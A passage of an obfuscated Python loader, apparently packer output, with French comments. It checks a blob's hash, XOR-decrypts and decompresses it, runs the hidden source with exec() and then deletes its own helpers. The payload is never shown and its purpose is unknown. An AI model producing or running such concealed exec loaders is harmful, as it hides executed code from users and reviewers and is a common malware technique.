_cmn8DQ1KiMwpqp + _cvm12pdgeHoYxR + _cqJ48lb2ztYg_g + _cfMK5HhyYXYheP + _cuXpZFiMH1sLLA + _cehMC7QpNJAa9W + _cljy1muRwVaqZV + _cdOsh4ok6Z7OYW + _cfD7cl1AVkHhTy + _cvmQvP1m1j3Vwx + _cfaremo4_yefY7 + _coR4upeUY5o9H6 + _cv1hnQ4Z06BMnL + _cnxzOB7KRGwohc + _cecVKnCgyWtGjj + _cjOH9gtyqsz7JE + _ckqCoeBSx4yX5r + _ctbvj58LVwDbun + _cd_358MBXgxlEK + _chm9IspAupDOzH + _czU2S261Ojjgzz + _cfQD57H7nz79Fc + _cz8p9hVqgjFNIK + _cqnf19BsASgr_q + _ctebPvCcFds2xu + _cnMTu_SqYHat5I + _cjuEFKhUh3WcGS + _cp8TZj86mrdRY8 + _cboFtNHQHYQrUd + _cpAzL6adboW37S + _chu5FcL26BhI6V + _ciNHibohy1x46Q + _c_lVHqMjiWnp5s + _cjwryaOvBBQ6a2 + _cgcG5XKuTJw7fx + _ctXBuojE_E78Nf + _cbSL48w6VEX8qU + _ciKosFxMXy24dN + _cv6qJommYcZU_Z + _ck2Yzwmp9w6ayD + _cqP16R6tiKc3wk + _cfeyAbdMlW_vkG + _csjkH3UCXwiqF3)
if __import__('hashlib').sha256(_pbg_A8xOQXQwia).hexdigest() != 'f45129afa004c709e93eba7e8d0c97918a1ea9b704b9e2a65a805df8423b4a87':
    __import__('sys').exit(1)
_xcvctZwMoWtxiZ = bytes([250, 173, 193, 226, 49, 145, 184, 52, 123, 109, 197, 170, 27, 93, 55, 51, 80, 253, 6, 47, 216, 131, 104, 113, 62, 159, 232, 12, 24, 177, 212])
_fkbfdi05J4Yeqll = bytes([42, 226, 37, 212, 251, 63, 192, 20, 136, 80, 174, 158, 61, 7, 191, 211, 82, 11, 129, 243, 188, 94, 48, 93, 110, 247, 225, 160, 91, 89, 170])

def _fxs_RqI3tQnWZuy(_bcvulNB6WTd4Ux, _kim8KbU9rvWNGc):
    return bytes(_bcvulNB6WTd4Ux[_ipONb7SxjUijPl] ^ _kim8KbU9rvWNGc[_ipONb7SxjUijPl % len(_kim8KbU9rvWNGc)] for _ipONb7SxjUijPl in range(len(_bcvulNB6WTd4Ux)))

def _fdwMcDliEBzTOGj(_tz9Pa907X6DPHB):
    import zlib
    return zlib.decompress(_tz9Pa907X6DPHB) # Un seul niveau de zlib ici pour simplifier

def _femZ1Y5syDVIax2():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xlHjL28bM9fOfH = _fxs_RqI3tQnWZuy(_pbg_A8xOQXQwia, _xcvctZwMoWtxiZ)
    # 2. Décompression Zlib
    _dyERnwRl8CEItP = _fdwMcDliEBzTOGj(_xlHjL28bM9fOfH)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dyERnwRl8CEItP.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nbT4ZPQsIFmksr = _main.__dict__
    _nbT4ZPQsIFmksr.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nbT4ZPQsIFmksr)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_femZ1Y5syDVIax2()
try:
    del _fxs_RqI3tQnWZuy, _fdwMcDliEBzTOGj, _femZ1Y5syDVIax2
    del _pbg_A8xOQXQwia, _xcvctZwMoWtxiZ, _fkbfdi05J4Yeqll
except:
    pass
